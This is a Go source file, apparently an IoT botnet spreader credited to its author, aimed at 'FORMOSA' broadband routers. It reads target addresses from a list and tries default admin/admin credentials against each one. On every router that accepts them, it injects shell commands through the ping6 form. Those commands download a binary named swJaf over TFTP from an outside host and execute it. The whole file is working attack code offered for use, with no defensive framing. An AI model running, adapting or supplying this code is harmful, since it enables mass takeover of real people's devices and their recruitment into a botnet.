/*

found & made by one and only @fdb2sxy

*/

package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	ipPorts, err := ioutil.ReadFile("ips.txt")
	if err != nil {
		fmt.Println("Error reading ips.txt:", err)
		return
	}

	ipPortLines := strings.Split(strings.TrimSpace(string(ipPorts)), "\n")

	for _, ipPortLine := range ipPortLines {
		ipPort := strings.TrimSpace(ipPortLine)
		testIPPort(ipPort)
	}
}

func testIPPort(ipPort string) {
	url := fmt.Sprintf("http://%s/boaform/admin/formLogin", ipPort)
	payload := []byte("challenge=&username=admin&password=admin&save=Login&submit-url=%2Fadmin%2Flogin.asp&postSecurityFlag=12726")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		//fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("Host", ipPort)
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload))) // Calculate content length
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", fmt.Sprintf("http://%s", ipPort))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Referer", fmt.Sprintf("http://%s/admin/login.asp", ipPort))
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		if strings.Contains(err.Error(), "Timeout") {
			//fmt.Println("Request timed out for", ipPort)
			return
		}
		//fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	// Reading the response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}


	if strings.Contains(string(body), "<title>BroadBand Device Webserver</title>") {
		fmt.Println("[FORMOSA] logged in successfully to:", ipPort)
		writeToFile(ipPort)

		testPing6(ipPort)
	} else {
		fmt.Println("[FORMOSA] login failed for:", ipPort)
	}
}

func testPing6(ipPort string) {
	url := fmt.Sprintf("http://%s/boaform/formPing6", ipPort)
	payload := []byte("pingAddr=%3bbusybox+tftp+-g+-r+swJaf+-l+/var/swJaf+ilikemy.clouds+69%3bcd+/var%3bchmod+0777+swJaf%3b./swJaf+formosa&wanif=65535&go=+Ping&submit-url=%2Fping6.asp")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, 
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		//fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("Host", ipPort)
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", fmt.Sprintf("http://%s", ipPort))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Referer", fmt.Sprintf("http://%s/ping6.asp", ipPort))
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cookie", "userLanguage=en")
	req.Header.Set("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		if strings.Contains(err.Error(), "Timeout") {
			fmt.Println("[FORMOSA] timing out on device:", ipPort) // timeouts are usually false positive, if it times out the request is still sent
			return
		}
		//fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Println("[FORMOSA] payload successfully sent")
}

func writeToFile(content string) {
	file, err := os.OpenFile("successful.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(content + "\n"); err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}
}
